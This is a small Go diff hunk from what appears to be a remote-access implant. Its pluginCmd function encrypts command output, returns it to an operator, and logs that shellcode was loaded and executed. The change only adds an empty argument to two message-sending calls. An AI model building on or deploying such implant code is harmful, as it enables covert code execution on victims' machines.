@@ -46,10 +46,10 @@ func pluginCmd(sendUserId, decData string) {
 	if stdErr != "" {
 		data := colorcode.OutputMessage(colorcode.SIGN_FAIL, stdErr)
 		outputMsg, _ := crypto.Encrypt([]byte(data), []byte(config.AesKey))
-		common.SendFailMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg)
+		common.SendFailMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg, "")
 	}
 
 	outputMsg, _ := crypto.Encrypt([]byte(stdOut), []byte(config.AesKey))
-	common.SendSuccessMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg)
+	common.SendSuccessMsg(sendUserId, common.ClientId, "plugin_ret", outputMsg, "")
 	debug.DebugPrint("the shellcode is loaded and executed successfully")
 }
